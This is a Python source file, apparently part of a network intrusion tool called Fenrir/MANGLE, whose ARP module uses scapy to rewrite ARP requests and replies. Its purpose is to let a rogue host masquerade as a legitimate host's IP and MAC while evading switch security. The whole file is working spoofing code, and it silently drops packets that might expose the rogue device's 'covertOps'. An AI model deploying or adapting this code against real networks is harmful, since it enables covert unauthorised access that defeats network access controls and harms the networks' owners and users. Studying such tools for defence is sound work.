# coding=utf-8
######################################################################
##|# -------- modARP : ARP management module for MANGLE -------- #|###
##|# - It is responsible for handling ARP requests and replies - #|###
##|# - in order to avoid triggering switch's security measures - #|###
##|# - while still providing address resolution possibilities  - #|###
##|# -          to both the legitimate and rogue host          - #|###
######################################################################

from scapy.all import *
from FenrirTail import FenrirTail


###################################################################
### ---------------- Main component of modARP ---------------- ####
###################################################################
class modARP :

	def __init__(self, ip_host, ip_rogue, mac_host, mac_rogue, debugLevel=1) :
		self.FenrirTail = FenrirTail(debugLevel)
		self.debugLevel = debugLevel
		self.FenrirTail.notify('Loading ARP module...', 1)
		self.ARPthreads = []
		self.ARPthread_number = 0
		self.host = ip_host
		self.rogue = ip_rogue
		self.mrogue = mac_rogue
		self.mhost = mac_host


	## modARP main routine ##
	def Fenrir_Address_Resolution_Protocol(self, ARPpkt) :
		if ARPpkt[ARP].op == 2 :  # ARP-reply
			self.FenrirTail.notify('ARP reply received', 3)
			for ARPthread in self.ARPthreads :
				if ARPthread.thisIsMyARP(ARPpkt) :
					self.FenrirTail.notify('Corresponding ARPthread found', 3)
					ARPthread.changeState()
					self.FenrirTail.notify("ARPthread state changed from 'rep_sent' to 'rep_rcvd'", 3)
					returnedPkt = self.ARPReplyMangling(ARPpkt, ARPthread)
					self.deleteARPthread(ARPthread)
					return returnedPkt
			self.FenrirTail.notify('No corresponding ARPthread found', 3)
			return ARPpkt # if no ARPthread, then forward the ARP-reply
		else :  # ARP request
			if self.checkForStrangeARP(ARPpkt) == False :  # check if ARP packet might compromise covertOps
				if ARPpkt[ARP].psrc == self.rogue or ARPpkt[ARP].psrc == self.host :
					self.FenrirTail.notify('Request from rogue or host, mangling...', 3)
					new_ARPthread = self.createARPthread(ARPpkt)
					return self.ARPRequestMangling(ARPpkt)
				elif ARPpkt[ARP].pdst == self.host :
					self.FenrirTail.notify('Request for host, forwarding...', 3)
					new_ARPthread = self.createARPthread(ARPpkt)
					return ARPpkt # if request for host, then forward
				else :
					return False  # drop pkt
			else :
				return False  # drop pkt


	## returns True if packet is strange and may need further processing, False otherwise ##
	def checkForStrangeARP(self, pkt) :
		if pkt[Ether].dst == self.mrogue or pkt[ARP].pdst == self.rogue :
			self.FenrirTail.notify('Strange ARP packet detected. Dropping it... You may want to check where this one came from : ', 1)
			ls(pkt)
			return True
		else : 
			self.FenrirTail.notify('ARP request received', 3)
			return False


	## Creates an ARPthread from an ARP-request packet ##
	def createARPthread(self, pkt) : 
		self.ARPthread_number += 1
		ARPthread_instance = ARPthread(self.debugLevel, pkt[Ether].src, pkt[Ether].dst, pkt[ARP].psrc, pkt[ARP].pdst, 'req_sent')
		self.ARPthreads.append(ARPthread_instance)
		self.FenrirTail.notify('New ARPthread created', 3)
		return ARPthread_instance


	## Deletion of complete ICMPthread ##
	def deleteARPthread(self, ARPthread) :
		try :
			if ARPthread.state == 'zombie' :
				self.FenrirTail.fenrirPanic('Unexpected situation occured during deletion of ARPthread (ARPthread is a zombie)')
			else :
				self.ARPthreads.remove(ARPthread)
				self.ARPthread_number -= 1
				self.FenrirTail.notify('ARPthread deleted', 3)
			return True
		except ValueError :
			self.FenrirTail.fenrirPanic('Unexpected exception was raised during deletion of ARPthread')


	## ARP Mangling Routines ##
	def ARPRequestMangling(self, pkt) :
		if pkt[ARP].psrc == self.rogue :
			return self.pktRewriter(pkt, self.host, 0, self.mhost, 0, self.mhost, 0)
		else :  # the ARP reply is for legit host
			return pkt
	def ARPReplyMangling(self, pkt, ARPthread) :
		if ARPthread.src_mac == self.mrogue :  # the ARP reply is for rogue
			return self.pktRewriter(pkt, 0, self.rogue, 0, self.mrogue, 0, self.mrogue)
		else :  # the ARP reply is for legit host
			return pkt


	## Rewrites ARP packets ##
	def pktRewriter(self, pkt, src, dst, msrc, mdst, hwsrc, hwdst) :
		self.FenrirTail.notify('ARP packet is being rewritten :', 3)
		if src != 0 :
			self.FenrirTail.notify('\t' + pkt[ARP].psrc + ' --> ' + src, 3)
			pkt[ARP].psrc = src
		if dst != 0 :
			self.FenrirTail.notify('\t' + pkt[ARP].pdst + ' --> ' + dst, 3)
			pkt[ARP].pdst = dst
		if msrc != 0 :
			pkt[Ether].src = msrc
		if hwsrc != 0 :
			self.FenrirTail.notify('\t' + pkt[ARP].hwsrc + ' --> ' + hwsrc, 3)
			pkt[ARP].hwsrc = hwsrc
		if mdst != 0 :
			pkt[Ether].dst = mdst
		if hwdst != 0 :
			self.FenrirTail.notify('\t' + pkt[ARP].hwdst + ' --> ' + hwdst, 3)
			pkt[ARP].hwdst = hwdst
		pkt = pkt.__class__(str(pkt))
		self.FenrirTail.notify('ARP packet mangled and rewritten successfully', 3)
		return pkt




###################################################################
### --- Class representing an ARP exchange between 2 hosts --- ####
###################################################################
class ARPthread :
	states = ['req_sent', 'rep_rcvd', 'zombie']

	#SOURCE is always from the host point of view (spoofed/rogue host)
	def __init__(self, debugLevel, msrc, mdst, asrc, adst, state = "req_sent") :
		self.FenrirTail = FenrirTail(debugLevel)
		self.src_mac = msrc
		self.src_ip = asrc
		self.dst_mac = mdst
		self.dst_ip = adst
		self.state = state


	def changeState(self) :
		if self.state == 'req_sent' :
			self.state = 'rep_rcvd'
		elif self.state == 'rep_rcvd' :
			self.state = 'zombie'
		else :
			self.FenrirTail.fenrirPanic("STRANGE ARP STATE DETECTED : '" + self.state + "' - Look for the 'changeState' function in modARP.py")

	## Returns True if a packet is a reply to a previous request
	def thisIsMyARP(self, pkt) :
		if pkt[ARP].psrc == self.dst_ip :
			return True
		else :
			return False


	## UTILS FUNCTIONS ##
	def logdump(self) :
		print('mac src : ' + self.src_mac)
		print('ip src : ' + self.src_ip)
		print('mac dst : ' + self.dst_mac)
		print('ip dst : ' + self.dst_ip)
		print('state : ' + self.state)